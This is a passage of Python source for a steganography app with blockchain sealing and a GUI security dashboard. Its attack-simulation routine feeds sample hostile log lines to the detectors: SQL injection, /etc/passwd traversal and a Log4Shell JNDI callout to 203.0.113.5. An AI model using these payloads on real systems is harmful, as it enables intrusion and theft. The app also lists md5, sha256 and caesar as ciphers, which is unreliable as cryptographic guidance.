        bad, n = [], 0
        for tx, bi in self.ledger.all_txs():
            if tx["type"] == TX_AI_AUDIT:
                n += 1
                rows, head = tx["data"].get("ai", {}).get("rows"), tx["data"]["file_sha256"]
                if pg.audit_row_hash(int(rows or 0)) != head:
                    bad.append({"block": bi, "audit_row": rows, "expected_hash": head[:16]})
        return {"chain": chain, "anchors_checked": n, "anchors_mismatched": bad[:20], "ok": chain["ok"] and not bad,
                "note": "A mismatch means the database history differs from what was sealed on the blockchain."}

    def seal_batch(self, items):
        with self._mine_lock:
            self.seal(items, bits=min(int(self.settings["bits"]), 20))

    # -- HIDE -----------------------------------------------------------
    def hide(self, path, kind, message, cid, secret, seal_on=True, keep_names=True, bits=None, rep=None,
             dlp_policy="warn") -> dict:
        rep = rep or (lambda *a: None)
        bits = bits or int(self.settings["bits"])
        pre = None
        if self.hub:
            rep(0, 0, "AI security pre-check…")
            pre = self.hub.pre_hide(message, path)
            if pre["decision"] == "block":
                raise AIPolicyBlock("The AI security check stopped this:\n\n• " + "\n• ".join(pre["warnings"]))
            if dlp_policy == "block" and pre["dlp"]["score"] >= 50:
                raise AIPolicyBlock("Policy 'block': the message contains sensitive data:\n\n• " + "\n• ".join(pre["dlp"]["reasons"][:4]))
        rep(0, 0, "Encrypting…")
        payload = encrypt_payload(cid, message, secret)
        rep(0, 0, "Hiding the message…")
        if kind == "image":
            out, engine = image_encode(path, payload), "PNG picture (lossless)"
            rep(1, 2, "Double-checking the result…")
            got = image_decode(out)
        else:
            out, engine = video_encode(path, payload, lambda c, t: rep(c, t, "Writing video frames…"))
            rep(0, 0, "Double-checking the result…")
            got = video_decode(out)
        if got != payload:
            try:
                os.remove(out)
            except OSError:
                pass
            raise RuntimeError("The output file did not keep the hidden data, so it was deleted. Run Help → Self-test to find out why.")
        post = ai = None
        if self.hub:
            rep(0, 0, "AI steganalysis of the result…")
            try:
                post = self.hub.post_hide(out, len(payload))
                ai = self.hub.ai_summary(pre, post)
                self.hub.record_op("hide", True, os.path.getsize(out), os.path.basename(out))
            except Exception as e:                       # AI problems must never lose the user's file
                ai = {"v": 1, "error": str(e)[:80]}
        seal, seal_err = None, None
        if seal_on:
            try:
                out_sha = file_sha256(out, lambda d, t: rep(d, t, "Fingerprinting the result…"))
                cover_sha = file_sha256(path, lambda d, t: rep(d, t, "Fingerprinting the original…"))
                data = {"file_sha256": out_sha, "cover_sha256": cover_sha, "file_size": os.path.getsize(out),
                        "kind": kind, "cipher": cid, "engine": engine, "app": APP_TAG}
                if ai:
                    data["ai"] = ai
                if keep_names:
                    data["name"] = os.path.basename(out)
                rep(0, 0, "Mining a blockchain block…")
                with self._mine_lock:
                    txs, blk = self.seal([(TX_REGISTER, data)], bits, lambda n: rep(0, 0, f"Mining a blockchain block…  {n:,} hashes tried"))
                seal = dict(tx=txs[0], block=blk[0]) if blk else None
                if seal and self.hub:
                    self.hub.audit("ledger.register", {"txid": txs[0]["txid"], "block": blk[0]["index"], "kind": kind, "cipher": cid,
                                                       "ai_risk": (ai or {}).get("risk")})
            except TaskCancelled:
                seal_err = "Ledger sealing was cancelled — your hidden file itself is fine."
            except Exception as e:
                seal_err = f"Could not seal on the ledger: {e}"
        return {"out": out, "payload": payload, "engine": engine, "seal": seal, "seal_err": seal_err, "ai": ai, "pre": pre, "post": post}

    # -- REVEAL ---------------------------------------------------------
    def reveal(self, raw, sha, path, secret, log_receipt, keep_names, bits, rep=None) -> dict:
        rep = rep or (lambda *a: None)
        pre = None
        if self.hub:
            pre = self.hub.pre_reveal(path)
            if pre["locked"]:
                raise AIPolicyBlock(f"Reveal is locked for another {pre['locked'] // 60 + 1} min by automated incident response "
                                    "(many wrong passphrases in a row). Cases → unlock, or wait.")
        rep(0, 0, "Decrypting…")
        try:
            res = decrypt_payload(raw, secret)
        except Exception:
            if self.hub:
                self.hub.record_op("reveal", False, 0, (sha or "")[:12])
            raise
        plain = res[1]
        post = None
        if self.hub:
            self.hub.record_op("reveal", True, len(plain), (sha or "")[:12])
            post = self.hub.post_reveal(plain)
        receipt = None
        if log_receipt:
            try:
                regs = self.ledger.lookup_file(sha)["register"]
                data = {"file_sha256": sha, "ref": regs[0][0]["txid"] if regs else None, "cipher": res[0], "app": APP_TAG}
                if pre and pre["scan"]:
                    data["ai"] = {"v": 1, "file_risk": pre["scan"]["score"], "content_flags": len(post["warnings"]) if post else 0}
                if keep_names:
                    data["name"] = os.path.basename(path)
                with self._mine_lock:
                    txs, blk = self.seal([(TX_REVEAL, data)], bits, lambda n: rep(0, 0, f"Sealing your receipt…  {n:,}"))
                receipt = (txs[0], blk[0]) if blk else None
                if receipt and self.hub:
                    self.hub.audit("ledger.reveal_receipt", {"txid": txs[0]["txid"], "block": blk[0]["index"], "cipher": res[0]})
            except TaskCancelled:
                receipt = None
            except Exception as e:
                receipt = ("error", str(e))
        return {"res": res, "receipt": receipt, "pre": pre, "post": post}

    # -- VERIFY / AI SCAN ----------------------------------------------
    def ai_scan_file(self, path, seal=False) -> dict:
        f = self.hub.scan_file(path, "verify")
        f["evidence"].pop("path", None)
        if seal:
            sha = f["evidence"].get("sha256") or file_sha256(path)
            data = {"file_sha256": sha, "app": APP_TAG, "name": os.path.basename(path)[:60],
                    "ai": {"v": 1, "verdict": f["verdict"], "score": f["score"], "why": [r[:100] for r in f["reasons"][:3]], "mitre": f["mitre"][:4]}}
            self.hub.seal_async(TX_AI_SCAN, data)
        return f

    def verify(self, path, seal=False) -> dict:
        sha = file_sha256(path)
        level, head, lines = inspect_file(self.ledger, sha, self.identity.id)
        out = {"sha256": sha, "ledger": {"level": level, "headline": head, "lines": [{"status": s, "text": t} for s, t in lines]}}
        if self.hub:
            out["ai_scan"] = self.ai_scan_file(path, seal)
        return out

    # -- API operations -------------------------------------------------
    def api_ops(self) -> dict:
        def hide(cover, message, cipher, secret, dlp_policy, seal_on):
            if cipher not in ("aes", "3des", "sha256", "md5", "caesar"):
                raise ValueError("API supports: aes, 3des, sha256, md5, caesar (RSA needs the desktop key manager)")
            kind = media_kind(cover)
            if kind is None:
                raise ValueError("cover must be an image (png/bmp/webp/tiff) or video (mp4/avi/mkv/mov/webm)")
            sec = int(secret) if cipher == "caesar" else str(secret)
            try:
                r = self.hide(cover, kind, message, cipher, sec, bool(seal_on) and bool(self.settings["ledger"]), bool(self.settings["names"]),
                              dlp_policy=dlp_policy)
            except AIPolicyBlock as e:
                raise PermissionError(str(e))
            pre = r["pre"] or {}
            return {"output_path": r["out"], "engine": r["engine"], "cipher": cipher, "ai": r["ai"], "warnings": pre.get("warnings", []),
                    "steganalysis": r["post"], "ledger": ({"txid": r["seal"]["tx"]["txid"], "block": r["seal"]["block"]["index"],
                                                           "file_sha256": r["seal"]["tx"]["data"]["file_sha256"]} if r["seal"] else None),
                    "ledger_error": r["seal_err"]}

        def reveal(path, secret):
            kind = media_kind(path)
            if kind is None:
                raise ValueError("unsupported file type")
            raw = (image_decode if kind == "image" else video_decode)(path)
            cid = detect_cipher(raw)
            if cid is None or CIPHER_BY_ID[cid]["mode"] == "rsa":
                raise ValueError("this payload needs RSA keys (desktop app) or is not a CryptoSec payload")
            sha = file_sha256(path)
            sec = int(secret) if cid == "caesar" else str(secret)
            try:
                r = self.reveal(raw, sha, path, sec, bool(self.settings["ledger"] and self.settings["receipts"]), bool(self.settings["names"]),
                                int(self.settings["bits"]))
            except AIPolicyBlock as e:
                raise PermissionError(str(e))
            except Exception:
                raise ValueError("Could not decrypt: wrong passphrase, or the file was altered.")
            level, head, lines = inspect_file(self.ledger, sha, self.identity.id)
            post = r["post"] or {}
            return {"message": r["res"][1], "cipher": cid, "ledger": {"level": level, "headline": head},
                    "warnings": (r["pre"] or {}).get("warnings", []) + post.get("warnings", []),
                    "receipt_block": r["receipt"][1]["index"] if r["receipt"] and r["receipt"][0] != "error" else None}

        def ledger():
            tip = self.ledger.snapshot()[-1]
            return {"height": self.ledger.height, "transactions": self.ledger.tx_count, "intact": self.ledger.intact, "tip": tip["hash"],
                    "signer": {"id": self.identity.id, "alias": self.identity.alias}}

        def validate():
            ok, problems = self.ledger.validate(deep=True)
            return {"ok": ok, "problems": [{"block": b, "problem": p} for b, p in problems][:50]}
        return {"hide": hide, "reveal": reveal, "verify": lambda p: self.verify(p, False), "ledger": ledger, "validate": validate,
                "mirror_verify": self.mirror_verify, "audit_verify": self.audit_verify}



# ═══════════════════════════════════════════════════════════════════════
#  v6  ·  AI SECURITY CENTER  (GUI pages)
# ═══════════════════════════════════════════════════════════════════════
SEV_COL = {"critical": RED, "high": ORANGE, "medium": GOLD, "low": TEAL, "info": MUTED}
AI_PAGES = ("ai", "lab", "cases", "api")


def _fmt_summary(res: dict) -> str:
    """Compact human-readable summary of an analysis result (everything except the findings list)."""
    out = []
    for k, v in res.items():
        if k in ("findings", "forecast"):
            continue
        if isinstance(v, dict):
            v = ", ".join(f"{a}={b}" for a, b in list(v.items())[:10])
        elif isinstance(v, (list, tuple)):
            v = "; ".join(str(x) for x in v[:8])
        out.append(f"{k.replace('_', ' ').capitalize():<22}{v}")
    fc = res.get("forecast")
    if isinstance(fc, dict):
        out.append(f"{'Forecast':<22}next {len(fc['forecast'])} buckets: " + ", ".join(f"{x:.0f}" for x in fc["forecast"][:12]) + " …")
        out.append(f"{'':<22}trend {fc['trend']} · period {fc['period']} · chance of breach {fc['p_exceed_any'] * 100:.0f}%")
    return "\n".join(out)


class AIPages:
    """Mixin for CryptoSecApp — builds the four AI pages and runs the live-refresh loop."""

    # ── plumbing ────────────────────────────────────────────────────────
    def _ai_init(self):
        self._ai_q: queue.Queue = queue.Queue()
        self._bus_seq = self.hub.bus.seq if self.hub else 0
        self._tick_n = 0
        self.api = None
        self.lab_mod = "malware"
        self.lab_findings: list = []
        self.ver_ai = None
        st = ttk.Style()
        st.configure("TCombobox", fieldbackground=INPUT, background=CARD2, foreground=TEXT, arrowcolor=ACCENT, bordercolor=BORDER)
        st.map("TCombobox", fieldbackground=[("readonly", INPUT)], foreground=[("readonly", TEXT)], selectbackground=[("readonly", INPUT)],
               selectforeground=[("readonly", TEXT)])
        self.root.option_add("*TCombobox*Listbox.background", INPUT)
        self.root.option_add("*TCombobox*Listbox.foreground", TEXT)

    def _ai_chip_init(self, top):
        self.ai_chip = tk.Label(top, text="🧠 AI · starting", font=FONT_SB, bg=SIDEBAR, fg=MUTED, cursor="hand2")
        self.ai_chip.pack(side="right", padx=8)
        self.ai_chip.bind("<Button-1>", lambda e: self.show_page("ai"))

    def _ai_nav(self, side):
        tk.Label(side, text="AI SECURITY CENTER", font=FONT_SB, fg=MUTED, bg=SIDEBAR).pack(anchor="w", padx=18, pady=(14, 4))
        for key, label in (("ai", "🧠   AI dashboard"), ("lab", "🧪   Detection lab"), ("cases", "🚨   Incidents"), ("api", "🔌   API & settings")):
            b = FlatButton(side, label, lambda k=key: self.show_page(k), bg=SIDEBAR, fg=TEXT, font=FONT, anchor="w", padx=18, pady=8)
            b.pack(fill="x")
            self.nav[key] = b

    def _tree(self, parent, cols, widths, height=8, stretch_col=None):
        fr = tk.Frame(parent, bg=CARD)
        tv = ttk.Treeview(fr, columns=[c[0] for c in cols], show="headings", height=height, selectmode="browse")
        for (cid, label), w in zip(cols, widths):
            tv.heading(cid, text=label)
            tv.column(cid, width=w, minwidth=40, stretch=(cid == (stretch_col or cols[-1][0])), anchor="w")
        sb = ttk.Scrollbar(fr, orient="vertical", command=tv.yview)
        tv.configure(yscrollcommand=sb.set)
        tv.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")
        for s, c in SEV_COL.items():
            tv.tag_configure(s, foreground=c)
        fr.tv = tv
        return fr

    def _stat(self, parent, label, color=ACCENT):
        f = tk.Frame(parent, bg=CARD, highlightthickness=1, highlightbackground=BORDER)
        v = tk.Label(f, text="–", font=("Segoe UI", 20, "bold"), fg=color, bg=CARD)
        v.pack(padx=14, pady=(8, 0))
        tk.Label(f, text=label, font=FONT_SB, fg=MUTED, bg=CARD).pack(padx=14, pady=(0, 8))
        f.val = v
        return f

    def _page_title(self, page, title, sub):
        tk.Label(page, text=title, font=FONT_H, fg=TEXT, bg=BG).pack(anchor="w", padx=18, pady=(14, 0))
        s = tk.Label(page, text=sub, font=FONT, fg=MUTED, bg=BG, justify="left", anchor="w")
        s.pack(fill="x", padx=18)
        autowrap(s)

    def _entry(self, parent, var, width=30, show=None):
        return tk.Entry(parent, textvariable=var, width=width, bg=INPUT, fg=TEXT, insertbackground=ACCENT, relief="flat", font=FONT_M,
                        highlightthickness=1, highlightbackground=BORDER, highlightcolor=ACCENT, show=show or "")

    def _btn(self, parent, text, cmd, color=CARD2, fg=TEXT, **kw):
        return FlatButton(parent, text, cmd, bg=color, fg=fg, font=FONT_SB, pady=6, padx=12, **kw)

    def _build_ai_pages(self):
        self._ai_init()
        self._build_ai_dash()
        self._build_lab()
        self._build_cases()
        self._build_api_page()
        self._lab_select("malware")

    # ── page 1 · DASHBOARD ──────────────────────────────────────────────
    def _build_ai_dash(self):
        sf = ScrollFrame(self.content)
        self.pages["ai"] = sf
        page = sf.inner
        self._page_title(page, "AI Security Center", "Live view of everything the 19 AI modules see — fed by this app's own hide/reveal activity, "
                         "your datasets and the real-time monitor. High-severity findings are sealed on the blockchain.")
        row = tk.Frame(page, bg=BG)
        row.pack(fill="x", padx=16, pady=(10, 0))
        self.st_alerts, self.st_crit, self.st_cases, self.st_blk, self.st_ioc, self.st_models = (
            self._stat(row, "ALERTS · 24 H"), self._stat(row, "CRITICAL / HIGH", RED), self._stat(row, "OPEN CASES", ORANGE),
            self._stat(row, "BLOCKED IPS", GOLD), self._stat(row, "IOCs", TEAL), self._stat(row, "MODELS TRAINED", ACCENT2))
        for w in (self.st_alerts, self.st_crit, self.st_cases, self.st_blk, self.st_ioc, self.st_models):
            w.pack(side="left", fill="x", expand=True, padx=3)
        mid = tk.Frame(page, bg=BG)
        mid.pack(fill="x", padx=16, pady=8)
        c = Card(mid, "RISK POSTURE")
        c.pack(side="left", fill="both", expand=True, padx=(0, 6))
        self.risk_lbl = tk.Label(c.body, text="–", font=("Segoe UI", 12, "bold"), fg=GREEN, bg=CARD, anchor="w")
        self.risk_lbl.pack(fill="x")
        self.risk_meter = Meter(c.body, height=10)
        self.risk_meter.pack(fill="x", pady=4)
        self.risk_top = tk.Label(c.body, text="", font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.risk_top.pack(fill="x")
        autowrap(self.risk_top)
        m = Card(mid, "REAL-TIME MONITOR")
        m.pack(side="left", fill="both", expand=True, padx=(6, 0))
        self.mon_log, self.mon_dir = tk.StringVar(), tk.StringVar()
        for lbl, var, kind in (("Log file", self.mon_log, "file"), ("Watch folder", self.mon_dir, "dir")):
            r = tk.Frame(m.body, bg=CARD)
            r.pack(fill="x", pady=2)
            tk.Label(r, text=lbl, width=11, anchor="w", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left")
            self._entry(r, var, 28).pack(side="left", fill="x", expand=True)
            self._btn(r, "…", lambda v=var, k=kind: v.set(filedialog.askopenfilename() if k == "file" else filedialog.askdirectory()) or None
                      ).pack(side="left", padx=(4, 0))
        r = tk.Frame(m.body, bg=CARD)
        r.pack(fill="x", pady=(6, 0))
        self.mon_btn = self._btn(r, "▶  Start monitoring", self.mon_toggle, GREEN, "#06121A")
        self.mon_btn.pack(side="left")
        self.mon_lbl = tk.Label(r, text="stopped", font=FONT_S, fg=MUTED, bg=CARD)
        self.mon_lbl.pack(side="left", padx=10)
        a = Card(page, "LIVE ALERTS   (double-click for details, reasons and actions)")
        a.pack(fill="both", expand=True, padx=16, pady=(0, 6))
        self.alert_tree = self._tree(a.body, (("t", "Time"), ("sev", "Severity"), ("mod", "Module"), ("score", "Score"), ("subj", "Subject")),
                                     (70, 80, 90, 55, 600), 9, "subj")
        self.alert_tree.pack(fill="both", expand=True)
        self.alert_tree.tv.bind("<Double-1>", lambda e: self._alert_detail())
        self.alert_items: dict = {}
        bar = tk.Frame(page, bg=BG)
        bar.pack(fill="x", padx=16, pady=(0, 10))
        for t, cmd in (("📊 Threat-intel report", self.show_intel_report), ("🔮 Forecast", self.show_forecast),
                       ("🧹 Clear alerts", self.clear_alerts), ("🎯 Try it: simulate attacks", self.simulate_attacks)):
            self._btn(bar, t, cmd).pack(side="left", padx=(0, 6))
        for a_ in self.hub.alerts.recent(200)[::-1]:
            self._add_alert_row(a_, quiet=True)

    def _add_alert_row(self, a, quiet=False):
        iid = self.alert_tree.tv.insert("", 0, values=(fmt_time(a["ts"])[11:19], a["severity"].upper(), a["module"],
                                                       a["score"], a["subject"][:120]), tags=(a["severity"],))
        self.alert_items[iid] = a
        kids = self.alert_tree.tv.get_children()
        if len(kids) > 400:
            for k in kids[400:]:
                self.alert_tree.tv.delete(k)
                self.alert_items.pop(k, None)

    def _alert_detail(self):
        sel = self.alert_tree.tv.selection()
        if sel and sel[0] in self.alert_items:
            self.show_finding(self.alert_items[sel[0]])

    def show_finding(self, f):
        win = self._dialog(f"{f['module']} · {f['severity']}", 700, 560)
        col = SEV_COL.get(f["severity"], ACCENT)
        tk.Label(win, text=f"{f['severity'].upper()} · score {f['score']}/100 · {f['verdict']}", font=("Segoe UI", 14, "bold"), fg=col, bg=BG
                 ).pack(anchor="w", padx=20, pady=(16, 2))
        tk.Label(win, text=f["subject"], font=FONT_B, fg=TEXT, bg=BG, wraplength=640, justify="left").pack(anchor="w", padx=20)
        t = make_text(win, height=16)
        t.pack(fill="both", expand=True, padx=20, pady=10)
        t.insert("1.0", "WHY\n" + "\n".join("  • " + r for r in f["reasons"]) + "\n\n")
        if f.get("mitre"):
            t.insert("end", "MITRE ATT&CK  " + ", ".join(f["mitre"]) + "\n\n")
        ev = {k: v for k, v in f.get("evidence", {}).items() if k not in ("features", "series")}
        if ev:
            t.insert("end", "EVIDENCE\n" + csai.dumps(ev, indent=1)[:3000])
        t.configure(state="disabled")
        row = tk.Frame(win, bg=BG)
        row.pack(pady=(0, 14))

        def explain():
            self.toast("Asking the AI explainer…", "info")
            threading.Thread(target=lambda: self._ai_q.put(("explain", f, self.hub.llm.explain(f))), daemon=True).start()
        for text, cmd in (("🚨 Open case", lambda: (self.hub.ir.open_case(f), self.toast("Case opened — see Incidents.", "ok"), self._refresh_cases())),
                          ("🧠 Explain", explain), ("Close", win.destroy)):
            self._btn(row, text, cmd, ACCENT2 if "case" in text else CARD2).pack(side="left", padx=4)

    def mon_toggle(self):
        mon = self.hub.monitor
        if mon.running():
            mon.stop()
            self.toast("Monitoring stopped.", "info")
        else:
            src = []
            if self.mon_log.get().strip():
                src.append({"path": self.mon_log.get().strip(), "type": "file"})
            if self.mon_dir.get().strip():
                src.append({"path": self.mon_dir.get().strip(), "type": "folder"})
            if not src:
                self.problem("Choose a log file and/or a folder to watch first.\n\nNew lines are analysed as they appear; new files "
                             "(pictures, videos, documents, programs) are scanned for malware and hidden data.", "Nothing to monitor")
                return
            try:
                mon.start(src)
                self.toast("Real-time monitoring started.", "ok")
            except Exception as e:
                self.problem(str(e), "Cannot start", "err")
        self._ai_refresh_dash()

    def show_intel_report(self):
        win = self._dialog("Threat intelligence", 760, 600)
        t = make_text(win, height=24, font=FONT_MS)
        t.pack(fill="both", expand=True, padx=16, pady=(16, 6))
        t.insert("1.0", self.hub.ti.report(24))
        t.configure(state="disabled")
        row = tk.Frame(win, bg=BG)
        row.pack(pady=(0, 12))

        def export(kind):
            ext = {"stix": ".json", "csv": ".csv", "block": ".txt"}[kind]
            p = filedialog.asksaveasfilename(defaultextension=ext, initialfile=f"cryptosec_intel_{kind}{ext}")
            if p:
                body = (csai.dumps(self.hub.ti.export_stix(), indent=1) if kind == "stix" else self.hub.ti.export_csv() if kind == "csv"
                        else "\n".join(self.hub.ti.blocklist()))
                with open(p, "w", encoding="utf-8") as f:
                    f.write(body)
                self.toast(f"Saved {os.path.basename(p)}", "ok")
        for text, cmd in (("Export STIX 2.1", lambda: export("stix")), ("Export CSV", lambda: export("csv")), ("Export IP blocklist", lambda: export("block")),
                          ("Close", win.destroy)):
            self._btn(row, text, cmd).pack(side="left", padx=4)

    def show_forecast(self):
        f = self.hub.detectors["predict"].from_alerts()
        self.show_finding(f)

    def clear_alerts(self):
        if messagebox.askyesno("Clear alerts", "Remove all stored alerts? (Blockchain records are never removed.)", parent=self.root):
            self.hub.alerts.clear()
            self.alert_tree.tv.delete(*self.alert_tree.tv.get_children())
            self.alert_items.clear()
            self._ai_refresh_dash()

    def simulate_attacks(self):
        """Pushes a realistic burst of attack events through the live pipeline so you can watch alerts, cases and sealing happen."""
        def work(rep):
            rep(0, 0, "Simulating attack traffic…")
            t0 = csai.now()
            n = 0
            for i in range(14):
                self.hub.ingest(csai.parse_log_line(f"May  4 09:{i:02d}:11 srv sshd[2210]: Failed password for root from 198.51.100.23 port {40000 + i} ssh2"), "simulation")
                n += 1
            self.hub.ingest(csai.parse_log_line("May  4 09:20:41 srv sshd[2301]: Accepted password for root from 198.51.100.23 port 40222 ssh2"), "simulation")
            for q in ("/item?id=1 UNION SELECT user,pass FROM users--", "/dl?f=../../../../etc/passwd", "/x?q=${jndi:ldap://203.0.113.5/a}"):
                self.hub.ingest(csai.parse_log_line(f'203.0.113.7 - - [04/May/2026:10:00:00 +0000] "GET {q} HTTP/1.1" 200 120 "-" "sqlmap/1.7"'), "simulation")
            self.hub.analyze("phishing", "http://paypal-verify.account-update.tk/login?id=1", source="simulation")
            self.hub.analyze("dlp", "card 4111 1111 1111 1111 and key AKIAABCDEFGHIJKLMNOP", source="simulation")
            return csai.now() - t0
        self.run_task("Simulating attacks…", work, lambda s: (self.toast("Simulation done — watch the alert list.", "ok"), self._ai_refresh_dash()))

    # ── page 2 · DETECTION LAB ──────────────────────────────────────────
    def _build_lab(self):
        sf = ScrollFrame(self.content)
        self.pages["lab"] = sf
        page = sf.inner
        self._page_title(page, "Detection Lab", "Pick one of the 19 AI modules, upload YOUR dataset (CSV · TSV · JSON · JSONL · log), train it, and analyse "
                         "data or single items. With no dataset every module still works in rules-only mode.")
        body = tk.Frame(page, bg=BG)
        body.pack(fill="both", expand=True, padx=16, pady=8)
        left = tk.Frame(body, bg=BG, width=272, height=330)
        left.pack(side="left", fill="y")
        left.pack_propagate(False)
        self.lab_list = tk.Listbox(left, bg=INPUT, fg=TEXT, selectbackground="#243049", selectforeground=ACCENT, relief="flat", font=FONT,
                                   activestyle="none", highlightthickness=1, highlightbackground=BORDER, exportselection=False)
        self.lab_list.pack(fill="both", expand=True)
        self.lab_keys = list(csai.MODULE_ORDER)
        order = ["malware", "phishing", "intrusion", "uba", "response", "vuln", "network", "spam", "iam", "risk", "logs", "anomaly", "fraud",
                 "intel", "password", "dlp", "alerts", "predict", "monitor"]
        self.lab_keys = order
        for k in order:
            d = self.hub.detectors[k]
            self.lab_list.insert("end", ("● " if d.model or d.trained_on else "○ ") + d.title)
        self.lab_list.bind("<<ListboxSelect>>", lambda e: self.lab_list.curselection() and self._lab_select(self.lab_keys[self.lab_list.curselection()[0]]))
        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True, padx=(10, 0))
        c = Card(right, "MODULE")
        c.pack(fill="x")
        self.lab_title = tk.Label(c.body, font=("Segoe UI", 12, "bold"), fg=ACCENT, bg=CARD, anchor="w")
        self.lab_title.pack(fill="x")
        self.lab_desc = tk.Label(c.body, font=FONT_S, fg=TEXT, bg=CARD, anchor="w", justify="left")
        self.lab_desc.pack(fill="x")
        autowrap(self.lab_desc)
        self.lab_cols = tk.Label(c.body, font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.lab_cols.pack(fill="x", pady=(4, 0))
        autowrap(self.lab_cols)
        d = Card(right, "1 · YOUR DATASET")
        d.pack(fill="x", pady=6)
        r = tk.Frame(d.body, bg=CARD)
        r.pack(fill="x")
        self._btn(r, "⬆ Upload dataset…", self.lab_upload, ACCENT, "#06121A").pack(side="left")
        self._btn(r, "✨ Load demo data", self.lab_demo).pack(side="left", padx=6)
        self.lab_ds = tk.StringVar()
        self.lab_ds_cb = ttk.Combobox(r, textvariable=self.lab_ds, state="readonly", width=26)
        self.lab_ds_cb.pack(side="left", padx=6)
        tk.Label(r, text="label column", font=FONT_S, fg=MUTED, bg=CARD).pack(side="left", padx=(10, 2))
        self.lab_label = tk.StringVar()
        self._entry(r, self.lab_label, 9).pack(side="left")
        r2 = tk.Frame(d.body, bg=CARD)
        r2.pack(fill="x", pady=(6, 0))
        self.lab_train_btn = self._btn(r2, "🧠 Train on dataset", self.lab_train, GREEN, "#06121A")
        self.lab_train_btn.pack(side="left")
        self._btn(r2, "🔍 Analyze dataset", self.lab_analyze_ds, ACCENT2).pack(side="left", padx=6)
        self.lab_extra = tk.Frame(r2, bg=CARD)
        self.lab_extra.pack(side="left", padx=6)
        self.lab_model_lbl = tk.Label(d.body, font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.lab_model_lbl.pack(fill="x", pady=(6, 0))
        autowrap(self.lab_model_lbl)
        i = Card(right, "2 · ANALYZE A SINGLE ITEM")
        i.pack(fill="x")
        self.lab_in_help = tk.Label(i.body, font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.lab_in_help.pack(fill="x")
        autowrap(self.lab_in_help)
        self.lab_in = make_text(i.body, height=2)
        self.lab_in.pack(fill="x", pady=4)
        r3 = tk.Frame(i.body, bg=CARD)
        r3.pack(fill="x")
        self._btn(r3, "▶ Analyze", self.lab_analyze_input, ACCENT, "#06121A").pack(side="left")
        o = Card(right, "RESULTS   (select a row for details)")
        o.pack(fill="both", expand=True, pady=6)
        self.lab_tree = self._tree(o.body, (("score", "Score"), ("sev", "Severity"), ("verdict", "Verdict"), ("subj", "Subject"), ("why", "Why")),
                                   (50, 75, 110, 230, 500), 8, "why")
        self.lab_tree.pack(fill="both", expand=True)
        self.lab_tree.tv.bind("<<TreeviewSelect>>", self._lab_row)
        self.lab_tree.tv.bind("<Double-1>", lambda e: self._lab_row(open_dialog=True))
        self.lab_sum = make_text(o.body, height=7, font=FONT_MS)
        self.lab_sum.pack(fill="x", pady=(6, 0))
        self.lab_sum.configure(state="disabled")

    def _lab_say(self, text):
        self.lab_sum.configure(state="normal")
        self.lab_sum.delete("1.0", "end")
        self.lab_sum.insert("1.0", text)
        self.lab_sum.configure(state="disabled")

    def _lab_select(self, key):
        self.lab_mod = key
        d = self.hub.detectors[key]
        if self.lab_list.curselection() != (self.lab_keys.index(key),):
            self.lab_list.selection_clear(0, "end")
            self.lab_list.selection_set(self.lab_keys.index(key))
        self.lab_title.configure(text=d.title)
        self.lab_desc.configure(text=d.blurb)
        self.lab_cols.configure(text="Dataset columns:  " + d.columns_help)
        self.lab_in_help.configure(text=d.input_help)
        self._lab_refresh_ds()
        for w in self.lab_extra.winfo_children():
            w.destroy()
        if key in ("malware", "dlp"):
            self._btn(self.lab_extra, "📄 Scan a file…", self.lab_scan_file).pack(side="left")
        if key == "network":
            self._btn(self.lab_extra, "📡 Analyze .pcap…", self.lab_pcap).pack(side="left")
        if key == "vuln":
            self._btn(self.lab_extra, "🔎 Scan localhost ports", self.lab_vuln_scan).pack(side="left")
        if key == "malware":
            self._btn(self.lab_extra, "🧰 Build dataset from folders…", self.lab_build_features).pack(side="left", padx=6)
        if key == "predict":
            self._btn(self.lab_extra, "🔮 Forecast my alerts", self.show_forecast).pack(side="left")
        self.lab_train_btn.configure(text=d.train_label)
        self.lab_train_btn.set_enabled(d.trainable)
        self.lab_tree.tv.delete(*self.lab_tree.tv.get_children())
        self.lab_findings = []
        self._lab_say("Upload a dataset (or press “Load demo data” to try the module with synthetic sample data), then Train and/or Analyze.")

    def _lab_refresh_ds(self):
        key = self.lab_mod
        names = list(self.hub.dataset_list(key))
        self.lab_ds_cb.configure(values=names)
        if names and self.lab_ds.get() not in names:
            self.lab_ds.set(names[-1])
        elif not names:
            self.lab_ds.set("")
        d = self.hub.detectors[key]
        if d.model:
            m = d.model.metrics
            keys = [f"{k} {m[k]}" for k in ("accuracy", "macro_f1", "auc") if k in m]
            txt = f"● Trained ({d.model.kind}) on “{d.trained_on['dataset']}” · {d.trained_on['rows']} rows" + (" · " + " · ".join(keys) if keys else "")
        elif d.trained_on:
            txt = f"● Loaded “{d.trained_on['dataset']}” ({d.trained_on.get('kind')}) · {d.trained_on['rows']} entries"
        else:
            txt = "○ No dataset loaded — running in rules-only mode."
        self.lab_model_lbl.configure(text=txt, fg=GREEN if d.model or d.trained_on else MUTED)
        i = self.lab_keys.index(key)
        self.lab_list.delete(i)
        self.lab_list.insert(i, ("● " if d.model or d.trained_on else "○ ") + d.title)
        self.lab_list.selection_set(i)

    def lab_upload(self):
        p = filedialog.askopenfilename(title="Choose a dataset", filetypes=[("Datasets", "*.csv *.tsv *.json *.jsonl *.ndjson *.log *.txt"), ("All files", "*.*")])
        if p:
            self._lab_ingest_path(p)

    def _lab_ingest_path(self, p):
        key = self.lab_mod

        def work(rep):
            rep(0, 0, "Reading dataset…")
            with open(p, "rb") as f:
                return self.hub.dataset_save(key, os.path.basename(p), f.read())

        def done(t):
            self._lab_refresh_ds()
            self.lab_ds.set(safe := csai.safe_name(os.path.basename(p)))
            lc = csai.detect_label(t.rows)
            self._lab_say(f"Loaded “{safe}”: {len(t):,} rows, {len(t.columns)} columns ({t.fmt}).\nColumns: {', '.join(t.columns[:14])}\n"
                          f"Label column detected: {lc or 'none (unsupervised / event analysis)'}\n\nNext: Train, or Analyze dataset.")
            if lc:
                self.lab_label.set(lc)
            self.log(f"Dataset loaded for {key}: {safe} ({len(t)} rows)", "ok")
        self.run_task("Loading dataset…", work, done)

    def lab_demo(self):
        key = self.lab_mod
